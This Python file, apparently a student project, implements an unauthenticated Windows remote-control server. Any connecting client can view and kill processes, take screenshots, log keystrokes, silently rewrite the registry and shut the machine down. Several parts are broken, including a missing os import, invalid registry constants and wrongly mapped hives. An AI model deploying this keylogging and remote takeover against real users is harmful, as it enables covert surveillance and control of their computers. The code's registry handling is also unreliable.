#=============================== ADD LIBRARIES ===============================#
from tkinter import *
from socket import *
from threading import Thread
from pyautogui import screenshot
from os import kill, startfile, system
from signal import SIGTERM
from wmi import WMI
from win32gui import IsWindowVisible, IsWindowEnabled, EnumWindows
from win32process import GetWindowThreadProcessId
import win32pdhutil
from pythoncom import CoInitialize
from pynput import keyboard
import winreg
import pathlib



#=============================== Define control code ===============================#
QUIT             =  '0'
PROCESS_RUNNING  =  '1'
APP_RUNNING      =  '2'
SHUT_DOWN        =  '3'
SCREEN_CAPTURE   =  '4'
KEYSTROKE        =  '5'
EDIT_REGISTRY    =  '6'
EXIT             =  '7'


CONTENT          =  'C'          # Send content of reg file from client
                                 #_____________________________________________________________________
EDIT             =  'E'          # Include: get value, set value, delete value, create key, delete key
                                 #_____________________________________________________________________
HOOK			 =  'H'          # Start hooking keyboard
                                 #_____________________________________________________________________
KILL             =  'K'          # Kill a process or an application
                                 #_____________________________________________________________________
PRINT            =  'P'          # Print hooked key
                                 #_____________________________________________________________________
START            =  'S'          # Start a process or an application
                                 #_____________________________________________________________________
TAKE             =  'T'          # Take a screenshot
                                 #_____________________________________________________________________
UNHOOK			 =  'U'          # Stop hooking keyboard
                                 #_____________________________________________________________________
VIEW             =  'V'          # View list processes or applications


#=============================== +++++++++++++++++++++++++ ===============================#

HOST = ''
PORT = 12225
Address = (HOST, PORT)
Server = socket(AF_INET, SOCK_STREAM)
global var_status

#=============================== +++++++++++++++++++++++++ ===============================#

def Process(Client_socket):
	while True:
		Code = Client_socket.recv(1).decode("utf8")
		if (Code == VIEW):

			# Running Windows functions in threads can be tricky since it often involves COM objects.
			CoInitialize()
			f = WMI()

			# Get data from excute query sentence
			processes = f.ExecQuery('select Name, ProcessId, ThreadCount from Win32_Process')
			for p in processes:
				Client_socket.sendall(bytes(str(p.ProcessId),"utf8"))
				Client_socket.recv(1)

				Client_socket.sendall(bytes(str(p.Name),"utf8"))
				Client_socket.recv(1)

				Client_socket.sendall(bytes(str(p.ThreadCount),"utf8"))
				Client_socket.recv(1)

			# Announce to client is end of list
			Client_socket.sendall(bytes('__END__',"utf8"))
		elif Code == KILL:
			Client_socket.sendall(bytes('1','utf8'))
			try:
				pid = int(Client_socket.recv(100).decode('utf8'))
				kill(pid,SIGTERM)
				Client_socket.sendall(bytes('1','utf8'))
			except:
				Client_socket.sendall(bytes('0','utf8'))
		elif Code == START:
			Client_socket.sendall(bytes('1','utf8'))
			try:
				name = Client_socket.recv(100).decode('utf8')
				startfile(name + '.exe')
				Client_socket.sendall(bytes('1','utf8'))
			except:
				Client_socket.sendall(bytes('0','utf8'))
		elif Code == QUIT:
			break


def get_hwnds_for_pid (pid):
	def callback (hwnd, hwnds):
		if IsWindowVisible (hwnd) and IsWindowEnabled (hwnd):
			_, found_pid = GetWindowThreadProcessId (hwnd)
			if found_pid == pid:
				hwnds.append (hwnd)
		return True
		pass    
  
	hwnds = []
	EnumWindows (callback, hwnds)
	return hwnds
	pass

def App(Client_socket):
	while True:
		Code = Client_socket.recv(1).decode("utf8")
		if (Code == VIEW):
			CoInitialize() # Running Windows functions in threads can be tricky since it often involves COM objects.
			f = WMI()
			for process in f.ExecQuery('select Name , ProcessId , ThreadCount from Win32_Process '):
				t = get_hwnds_for_pid(process.ProcessId)
				if (len(t) != 0):
					Client_socket.sendall(bytes(str(process.ProcessId),"utf8"))
					Client_socket.recv(1)

					Client_socket.sendall(bytes(str(process.Name),"utf8"))
					Client_socket.recv(1)

					Client_socket.sendall(bytes(str(process.ThreadCount),"utf8"))
					Client_socket.recv(1)

			Client_socket.sendall(bytes('__END__',"utf8"))
		elif Code == KILL:
			Client_socket.sendall(bytes('1','utf8'))
			try:
				pid = int(Client_socket.recv(100).decode('utf8'))
				kill(pid,SIGTERM)
				Client_socket.sendall(bytes('1','utf8'))
			except:
				Client_socket.sendall(bytes('0','utf8'))
		elif Code == START:
			Client_socket.sendall(bytes('1','utf8'))
			try:
				name = Client_socket.recv(100).decode('utf8')
				startfile(name + '.exe')
				Client_socket.sendall(bytes('1','utf8'))
			except:
				Client_socket.sendall(bytes('0','utf8'))
		elif Code == QUIT:
			break

def take_picture(Client_socket):
	while True:
		Code = Client_socket.recv(1).decode("utf8")
		# Take picture
		if (Code == TAKE):
			#screen capture
			# myScreenshot = pyautogui.screenshot()
			myScreenshot = screenshot()
			f = myScreenshot.tobytes()
			sizef = f.__sizeof__()

			#size of picture
			Client_socket.sendall(bytes(str(sizef),'utf8'))
			Client_socket.recv(1)

			#width of picture
			Client_socket.sendall(bytes(str(myScreenshot.width),'utf8'))
			Client_socket.recv(1)

			#height of picture
			Client_socket.sendall(bytes(str(myScreenshot.height),'utf8'))
			Client_socket.recv(1)

			#picture
			Client_socket.sendall(f)
		# Quit
		elif (Code == QUIT):
			print('quit screenshot')
			break

def keystroke(Client_socket):
	print('do keystroke')
	text = ''
	unhook = True
	def on_press(key):
		nonlocal unhook
		nonlocal text
		if not unhook:
			key = str(key)
			key = key.replace("'","")
			if key == "Key.enter":
				key = "\n"
			elif key == "Key.space":
				key = " "
			elif key == "Key.tab":
				key = "\t"
			elif key == "Key.backspace":
				key = "\b"
			text += str(key)
			print(text)
		else:
			text = ''

	listener = keyboard.Listener(on_press = on_press, daemon = True)
	listener.daemon = True
	listener.start()

	while True:
		Code = Client_socket.recv(1).decode("utf8")
		if (Code == HOOK):
			print('do hook')
			if unhook:
				unhook = False
				text = ''
		elif Code == UNHOOK:
			print('do unhook')
			if not unhook:
				unhook = True
				text = ''
		elif Code == PRINT:
			print('do print')
			l = len(text)
			Client_socket.sendall(bytes(str(l),'utf8'))
			Client_socket.recv(1)
			if l == 0:
				Client_socket.sendall(bytes('0','utf8'))
			else:
				Client_socket.sendall(bytes(text,'utf8'))
			Client_socket.recv(1)
			text = ''
		elif Code == QUIT:
			listener.stop()
			break


def edit_registry(Client_socket):
	while True:
		Code = Client_socket.recv(1).decode("utf8")

		if (Code == CONTENT):
			s = Client_socket.recv(5000).decode("utf8")
			Client_socket.sendall(bytes('1', 'utf8'))

			fileReg = open('fileReg.reg', 'w')
			fileReg.write(s)
			fileReg.close()
			Link = str(pathlib.Path(__file__).parent.absolute()) + 'fileReg.reg'
			test = True
			try:
				os.system("C:\\Windows\\regedit.exe /s \"" + Link + "\"")
			except:
				test = False
			if test:
				# sua thanh cong
				Client_socket.sendall(bytes('1', 'utf8'))
			else:
				# sua that bai
				Client_socket.sendall(bytes('0', 'utf8'))
			Client_socket.recv(1).decode('utf8')

		elif (Code == QUIT):
			return

		elif (Code == EDIT):
			# get value of client
			option = Client_socket.recv(100).decode('utf8')
			Client_socket.sendall(bytes("1", "utf8"))

			link = Client_socket.recv(100).decode('utf8')
			Client_socket.sendall(bytes("1", "utf8"))
			
			valueName = Client_socket.recv(100).decode('utf8')
			Client_socket.sendall(bytes("1", "utf8"))
			
			value = Client_socket.recv(100).decode('utf8')
			Client_socket.sendall(bytes("1", "utf8"))
			
			typeValue = Client_socket.recv(100).decode('utf8')
			Client_socket.sendall(bytes("1", "utf8"))

			s = 'error'			

			try:
				# xu li link
				if 'HKEY_CURRENT_USER' in link:
					hkey = winreg.HKEY_CURRENT_USER
					sub_key = link[18:]
				elif 'HKEY_CLASSES_ROOT' in link:
					hkey = winreg.HKEY_CLASSES_ROOT
					sub_key = link[18:]
				elif 'HKEY_LOCAL_MACHINE' in link:
					hkey = winreg.HKEY_CLASSES_ROOT
					sub_key = link[19:]
				elif 'HKEY_USER' in link:
					hkey = winreg.HKEY_CLASSES_ROOT
					sub_key = link[10:]
				elif 'HKEY_CURRENT_CONFIG' in link:
					hkey = winreg.HKEY_CLASSES_ROOT
					sub_key = link[20:]


				if (option == 'Get value'):
					key = winreg.OpenKey(hkey, sub_key, access=winreg.KEY_ALL_ACCESS)
					s = winreg.QueryValueEx(key, valueName)[0]
					winreg.CloseKey(key)
				elif (option == 'Set value'):
					key = winreg.OpenKey(hkey, sub_key, access=winreg.KEY_ALL_ACCESS)
					type_value = ReturnWirg(typeValue)
					winreg.SetValueEx(key, valueName, 0, type_value, value)
					s = 'oke'
					winreg.CloseKey(key)
				elif (option == 'Delete value'):
					key = winreg.OpenKey(hkey, sub_key, access=winreg.KEY_ALL_ACCESS)
					winreg.DeleteValue(key, valueName)
					s = 'oke'
					winreg.CloseKey(key)
				elif (option == 'Create key'):
					key1 = winreg.ConnectRegistry(None, hkey)
					winreg.CreateKey(key1, sub_key)
					s = 'oke'
				elif (option == 'Delete key'):
					key1 = winreg.ConnectRegistry(None, hkey)
					winreg.DeleteKey(key1, sub_key)
					s = 'oke'
					winreg.CloseKey(key1)
			except:
				s = 'error'

			Client_socket.sendall(bytes(s, 'utf8'))
			tempt = Client_socket.recv(1).decode('utf8')


def ReturnWirg(name):
	if (name == 'String'):
		return winreg.REG_SZ
	if (name == 'Binary'):
		return winreg.BINARY
	if (name == 'DWORD'):
		return winreg.DWORD
	if (name == 'QWORD'):
		return winreg.QWORD
	if (name == 'Multi-String'):
		return winreg.MULTI_SZ
	if (name == 'Expandable String'):
		return winreg.EXPAND_SZ
	return None
	if (name == 'String'):
		return winreg.REG_SZ
	if (name == 'Binary'):
		return winreg.BINARY
	if (name == 'DWORD'):
		return winreg.DWORD
	if (name == 'QWORD'):
		return winreg.QWORD
	if (name == 'Multi-String'):
		return winreg.MULTI_SZ
	if (name == 'Expandable String'):
		return winreg.EXPAND_SZ
	return None



def Shutdown_Computer():
	print('shutdown')

	# Shutdown after 30 seconds
	system("shutdown /s /t 30")

def accept_incoming_connection():
	while True:
		try:
			Client_socket, Client_add = Server.accept()
			Z = Thread(target=Run,args=(Client_socket,Client_add,))
			Z.daemon = True # thread exit automatically when the main thread dies
			Z.start()
		except Exception as e:
			print(e)
			pass

	
def Run(Client_socket,Client_add):
	print(str(Client_add) + ' has connected')
	try:
		# ket client
		# Client_socket, Client_add = Server.accept()
		while True:
			Code = Client_socket.recv(1).decode("utf8")
			#QUIT
			if (Code == QUIT):
				Client_socket.close()
				break
			#Process
			if (Code == PROCESS_RUNNING):
				Process(Client_socket)
			#App Running
			if (Code == APP_RUNNING):
				App(Client_socket)
			#ShutDown
			if (Code == SHUT_DOWN):
				print('tat')
				Shutdown_Computer()
			#TAKEPIC
			if (Code == SCREEN_CAPTURE):
				take_picture(Client_socket)
			#KeyStock
			if (Code == KEYSTROKE):
				keystroke(Client_socket)
			#Edit_Register
			if (Code == EDIT_REGISTRY):
				edit_registry(Client_socket)
			#Exit
			if (Code == EXIT):
				Client_socket.close()
				print(str(Client_add) + ' has disconnected')
				break
	except Exception as e:
		print(e)
		print("Close")
		Client_socket.close()

def Run_Program(label1):
	if label1.cget("text") == 'OFF':
		var_status.set('ON')
		label1.configure(fg='green')
		Server.bind(Address)
		Server.listen(5)
		Z = Thread(target=accept_incoming_connection)
		Z.daemon = True # thread exit automatically when the main thread dies
		Z.start()


def on_closing():
	Server.close()
	window.destroy()


if __name__ == "__main__":
	window = Tk()
	window.title("Server")
	window.geometry("300x200+100+60")
	button = Button(window, text="Run Server",padx=15,pady=15, width=10, height=4, command=lambda:Run_Program(label1))
	button.pack()
	var_status = StringVar()
	var_status.set('OFF')

	label1 = Label(window,textvariable = var_status,fg='red')
	label1.pack()

	window.protocol("WM_DELETE_WINDOW", on_closing)
	window.mainloop()